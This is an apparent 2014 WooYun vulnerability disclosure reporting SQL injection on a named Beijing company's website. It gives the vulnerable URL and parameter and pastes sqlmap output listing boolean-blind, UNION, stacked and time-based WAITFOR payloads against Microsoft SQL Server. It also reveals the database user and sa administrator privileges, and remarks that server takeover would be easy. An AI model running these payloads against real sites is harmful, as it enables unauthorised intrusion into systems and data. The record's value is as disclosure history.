wybug_title: 北京勤科科技有限公司网站SQL注入

wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2014-02-21：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-04-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 北京勤科科技有限公司网站SQL注入 详细说明：  网站注入点太多了...http://www.kingqer.com/NewsDetail.aspx?stype=2&id=455sqlmap identified the following injection points with a total of 58 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: stype=2&id=455 AND 2760=2760    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: stype=2&id=-4940 UNION ALL SELECT NULL,CHAR(113)+CHAR(100)+CHAR(107)+CHAR(115)+CHAR(113)+CHAR(104)+CHAR(80)+CHAR(120)+CHAR(80)+CHAR(102)+CHAR(71)+CHAR(71)+CHAR(121)+CHAR(83)+CHAR(89)+CHAR(113)+CHAR(118)+CHAR(101)+CHAR(104)+CHAR(113)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: stype=2&id=455; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: stype=2&id=455 WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: stype=2&id=455 AND 2760=2760    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: stype=2&id=-4940 UNION ALL SELECT NULL,CHAR(113)+CHAR(100)+CHAR(107)+CHAR(115)+CHAR(113)+CHAR(104)+CHAR(80)+CHAR(120)+CHAR(80)+CHAR(102)+CHAR(71)+CHAR(71)+CHAR(121)+CHAR(83)+CHAR(89)+CHAR(113)+CHAR(118)+CHAR(101)+CHAR(104)+CHAR(113)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: stype=2&id=455; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: stype=2&id=455 WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005current user:    'kingqerweb'database management system users privileges:[*] kingqerweb[*] sa (administrator)   漏洞证明：  都这权限了，拿服务器很简单吧，就不开证明了。   修复方案：  你懂的   版权声明：转载请注明来源 Neeke@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
